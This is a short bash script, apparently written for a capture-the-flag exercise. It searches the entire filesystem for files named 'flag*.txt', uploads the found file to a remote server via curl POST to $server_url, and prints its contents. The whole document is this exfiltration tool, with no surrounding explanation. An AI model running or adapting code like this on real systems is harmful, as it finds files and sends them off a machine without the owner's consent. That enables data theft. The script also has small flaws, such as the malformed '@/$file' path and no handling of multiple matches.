#!/bin/bash

search_dir="/"

file=$(find "$search_dir" -type f -name "flag*.txt")

if [ -n "$file" ]; then
  echo "File found: $file"
  curl -d @/$file -X POST $server_url
  echo "Flag contents is $(cat $file)"
else
  echo "No file starting with 'flag' found in $search_dir."
fi
